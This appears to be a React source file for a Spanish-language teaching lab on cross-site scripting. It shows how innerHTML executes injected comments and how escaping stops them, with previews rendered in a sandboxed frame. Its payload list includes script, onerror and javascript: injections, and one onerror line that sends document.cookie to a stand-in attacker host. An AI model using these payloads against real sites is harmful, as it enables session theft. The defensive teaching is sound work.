import { useId, useMemo, useState } from 'react';
import { Enlace, Escena, Impacto, Nodo, Paquete, TextoEscena } from '../componentes/Escena';
import { FilaChips, Lectura, Veredicto } from './piezas';
import type { PropsLab } from './tipos';
import {
  analizarHtml,
  describirEfecto,
  efectoDe,
  escaparHtml,
  paginaVistaPrevia,
  textoDeAlerta,
} from './logica/xss';

const PAYLOADS = [
  { etiqueta: 'Comentario normal', texto: 'Muy buen artículo, gracias.', ayuda: 'Lo que escribe casi todo el mundo.' },
  { etiqueta: 'Letra grande', texto: '<h1>HOLA</h1>', ayuda: 'HTML inofensivo: sirve para comprobar si se interpreta.' },
  { etiqueta: 'Con <script>', texto: '<script>alert(1)</script>', ayuda: 'El clásico. Mira qué pasa con innerHTML.' },
  { etiqueta: 'Imagen rota', texto: '<img src=x onerror="alert(\'XSS\')">', ayuda: 'La imagen falla y se dispara onerror.' },
  {
    etiqueta: 'Robar la sesión',
    texto: '<img src=x onerror="fetch(\'https://atacante.example/?c=\'+document.cookie)">',
    ayuda: 'Manda document.cookie a un servidor del atacante.',
  },
  {
    etiqueta: 'Enlace trampa',
    texto: '<a href="javascript:alert(1)">Haz clic para ver el premio</a>',
    ayuda: 'Se ejecuta cuando alguien pulsa el enlace.',
  },
];

export default function LabXss({ modo }: PropsLab) {
  const id = useId();
  const [texto, setTexto] = useState(PAYLOADS[0].texto);
  const [publicado, setPublicado] = useState<string | null>(null);
  const [envios, setEnvios] = useState(0);
  const [elegido, setElegido] = useState<number | null>(null);

  const vulnerable = modo === 'vulnerable';

  const publicar = (valor: string) => {
    setPublicado(valor);
    setEnvios((n) => n + 1);
  };

  const analisis = useMemo(() => {
    if (publicado === null) return null;
    const vias = analizarHtml(publicado);
    const hayHtml = /<[a-zA-Z!/]/.test(publicado);
    const efectivas = vulnerable ? vias.filter((v) => v.conInnerHtml) : [];
    const ignoradas = vulnerable ? vias.filter((v) => !v.conInnerHtml) : [];
    const principal = efectivas[0];
    const efecto = principal ? efectoDe(principal.codigo) : null;
    return { vias, hayHtml, efectivas, ignoradas, principal, efecto };
  }, [publicado, vulnerable]);

  const srcDoc = useMemo(
    () =>
      paginaVistaPrevia([
        { autor: 'Ana', html: 'Muy buen artículo, gracias por compartirlo.' },
        ...(publicado === null
          ? []
          : [{ autor: 'Tú', html: vulnerable ? publicado : escaparHtml(publicado) }]),
      ]),
    [publicado, vulnerable],
  );

  let estado: 'brecha' | 'bloqueado' | 'ok' | 'aviso' | null = null;
  let titulo = '';
  let detalle = '';
  if (analisis) {
    if (analisis.efectivas.length > 0) {
      estado = 'brecha';
      titulo = 'El navegador ejecutó código de otra persona';
      const p = analisis.principal!;
      detalle =
        p.disparo === 'al cargar'
          ? `${describirEfecto(analisis.efecto!)} Pasa ${p.disparo}: nadie tiene que hacer nada.`
          : `${describirEfecto(analisis.efecto!)} Se dispara ${p.disparo}.`;
    } else if (analisis.ignoradas.length > 0) {
      estado = 'aviso';
      titulo = 'Esta vez el navegador ignoró el <script>';
      detalle =
        'innerHTML no ejecuta las etiquetas <script> que inserta. Pero no te confíes: prueba «Imagen rota» y verás que hay muchas otras puertas.';
    } else if (vulnerable && analisis.hayHtml) {
      estado = 'aviso';
      titulo = 'El texto se convirtió en parte de la página';
      detalle = 'No ejecutó código, pero quien controla el HTML controla cómo se ve tu página. Es el primer paso.';
    } else if (!vulnerable && analisis.hayHtml) {
      estado = 'bloqueado';
      titulo = 'Se muestra como texto, no como página';
      detalle = 'Los símbolos < y > se convirtieron en caracteres normales: el navegador no los interpreta.';
    } else {
      estado = 'ok';
      titulo = 'Comentario normal';
      detalle = 'Es solo texto: no hay nada que ejecutar.';
    }
  }

  const alerta =
    analisis?.efectivas.find((v) => v.disparo === 'al cargar' && efectoDe(v.codigo) === 'alerta') ?? null;
  const textoAlerta = alerta ? textoDeAlerta(alerta.codigo) : null;

  const roba = vulnerable && analisis?.efecto === 'cookie' && analisis.principal?.disparo === 'al cargar';
  const ejecuta = vulnerable && Boolean(analisis?.principal) && analisis?.principal?.disparo === 'al cargar';

  const reinicio = `${envios}-${modo}`;
  const arco = 'M450 142 C450 205 70 205 70 142';

  return (
    <div className="lab lab-xss">
      <div className="lab-fila">
        <form
          className="lab-controles"
          onSubmit={(e) => {
            e.preventDefault();
            setElegido(null);
            publicar(texto);
          }}
        >
          <div className="campo">
            <label htmlFor={`${id}-t`}>Escribe un comentario (puede llevar HTML)</label>
            <textarea
              id={`${id}-t`}
              className="entrada"
              rows={3}
              value={texto}
              spellCheck={false}
              onChange={(e) => setTexto(e.target.value)}
            />
          </div>
          <button type="submit" className="boton">
            Publicar comentario
          </button>
          <FilaChips
            titulo="O prueba un ataque con un clic"
            items={PAYLOADS.map((p) => ({ etiqueta: p.etiqueta, ayuda: p.ayuda }))}
            activo={elegido}
            alElegir={(i) => {
              setElegido(i);
              setTexto(PAYLOADS[i].texto);
              publicar(PAYLOADS[i].texto);
            }}
          />
        </form>

        <div className="lab-escena">
          <Escena
            ancho={520}
            alto={215}
            titulo="Una persona publica un comentario en el blog; el blog lo muestra al visitante, cuyo navegador lo interpreta"
            reinicio={reinicio}
          >
            <Enlace d="M112 70 H208" estado={ejecuta ? 'ataque' : 'dato'} />
            <Enlace d="M312 70 H408" estado={ejecuta ? 'ataque' : vulnerable ? 'dato' : 'defensa'} />
            <Enlace d={arco} estado={roba ? 'ataque' : 'apagado'} punteada={!roba} />
            <Nodo
              x={70}
              y={70}
              glifo="atacante"
              etiqueta="Quien comenta"
              sub={roba ? 'recibe la sesión' : undefined}
              estado={roba ? 'ataque' : 'normal'}
            />
            <Nodo x={260} y={70} glifo="servidor" etiqueta="Tu blog" sub="guarda el comentario" />
            <Nodo
              x={450}
              y={70}
              glifo="navegador"
              etiqueta="Quien lee la página"
              sub={vulnerable ? 'interpreta como HTML' : 'lo ve como texto'}
              estado={
                ejecuta && analisis?.efectivas.length ? 'ataque' : publicado !== null && !vulnerable ? 'defensa' : 'normal'
              }
            />
            {publicado !== null && (
              <>
                <Paquete d="M112 70 H208" estado={ejecuta ? 'ataque' : 'dato'} dur={1} />
                <Paquete d="M312 70 H408" estado={ejecuta ? 'ataque' : vulnerable ? 'dato' : 'defensa'} dur={1} retardo={1.1} />
                {roba && <Paquete d={arco} estado="ataque" dur={1.6} retardo={2.2} texto="sesion=ab12…" />}
                {estado === 'brecha' && !roba && <Impacto x={450} y={18} tipo="brecha" retardo={2.1} />}
                {roba && <Impacto x={70} y={18} tipo="brecha" retardo={3.8} />}
                {estado === 'bloqueado' && <Impacto x={450} y={18} tipo="bloqueo" retardo={2.1} />}
                {estado === 'ok' && <Impacto x={450} y={18} tipo="ok" retardo={2.1} />}
              </>
            )}
            <TextoEscena x={260} y={206} estado={vulnerable ? 'ataque' : 'defensa'}>
              {vulnerable ? 'innerHTML: el texto se interpreta como HTML' : 'textContent: el texto se muestra tal cual'}
            </TextoEscena>
          </Escena>
        </div>
      </div>

      <div className="lab-xss-resultado">
        <div className="marco-nav">
          <div className="marco-nav-barra" aria-hidden="true">
            <span className="marco-nav-puntos">
              <i />
              <i />
              <i />
            </span>
            <span className="marco-nav-url">https://mi-blog.example/articulo/12</span>
          </div>
          <div className="marco-nav-cuerpo">
            <iframe
              className="marco-nav-iframe"
              title="Vista de la página del blog con tu comentario (marco aislado)"
              sandbox=""
              referrerPolicy="no-referrer"
              srcDoc={srcDoc}
            />
            {alerta && (
              <div className="alerta-falsa" role="img" aria-label="Ventana de alerta simulada">
                <div className="alerta-falsa-titulo">mi-blog.example dice</div>
                <div className="alerta-falsa-texto">{textoAlerta ?? ''}</div>
                <div className="alerta-falsa-boton">Aceptar</div>
              </div>
            )}
          </div>
          <p className="marco-nav-nota">
            Este marco está aislado (sandbox): aquí no se ejecuta nada de verdad. Lo que ves es lo que dibujaría el
            navegador; la lectura de abajo dice qué habría pasado en una página real.
          </p>
        </div>

        <div className="lab-lecturas">
          {estado && (
            <Veredicto tipo={estado} titulo={titulo}>
              {detalle}
            </Veredicto>
          )}

          {analisis && (analisis.efectivas.length > 0 || analisis.ignoradas.length > 0) && (
            <Lectura titulo="Lo que encontró el navegador dentro del comentario" estado={analisis.efectivas.length ? 'ataque' : 'dato'} mono={false}>
              <ul className="lista-vias">
                {[...analisis.efectivas, ...analisis.ignoradas].map((v, i) => {
                  const ignorada = !v.conInnerHtml;
                  return (
                    <li key={i} className={`via${ignorada ? ' via-ignorada' : ''}`}>
                      <div className="via-cabecera">
                        <strong>{v.etiqueta}</strong>
                        <span className={`via-disparo${ignorada ? '' : ' via-disparo-peligro'}`}>
                          {ignorada ? 'innerHTML no lo ejecuta' : v.disparo}
                        </span>
                      </div>
                      <code className="codigo via-codigo">{v.codigo}</code>
                    </li>
                  );
                })}
              </ul>
            </Lectura>
          )}

          {!vulnerable && publicado !== null && (
            <Lectura titulo="Lo que se guardó en la página (texto escapado)" estado="defensa">
              <div className="consulta">{escaparHtml(publicado)}</div>
              <div className="leyenda">
                <span className="leyenda-item">&lt; se vuelve &amp;lt; y &gt; se vuelve &amp;gt;: son letras, no etiquetas.</span>
              </div>
            </Lectura>
          )}
        </div>
      </div>
    </div>
  );
}
